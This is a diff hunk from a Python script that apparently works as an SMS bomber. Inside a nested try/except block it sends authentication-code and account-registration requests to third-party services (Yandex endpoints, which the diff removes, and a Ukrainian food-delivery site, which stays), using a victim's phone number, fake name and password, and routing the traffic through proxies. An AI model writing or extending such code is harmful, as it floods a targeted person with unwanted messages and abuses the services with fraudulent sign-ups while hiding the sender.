@@ -333,14 +333,6 @@ def Main():
 												except:
 													pass
 												try:
-													requests.post("https://api.chef.yandex/api/v2/auth/sms", json={"phone": _phone}, proxies=proxies)
-												except:
-													pass
-												try:
-													requests.post("https://eda.yandex/api/v1/user/request_authentication_code",json={"phone_number": "+" + _phone}, proxies=proxies)
-												except:
-													pass
-												try:
 													requests.post("https://www.yaposhka.kh.ua/customer/account/createpost/",data={"success_url": "","error_url": "","is_subscribed": "0","firstname":name,"lastname": name,"email": email,"password":name,"password_confirmation": name,"telephone": _phone}, proxies=proxies)
 												except:
 													pass
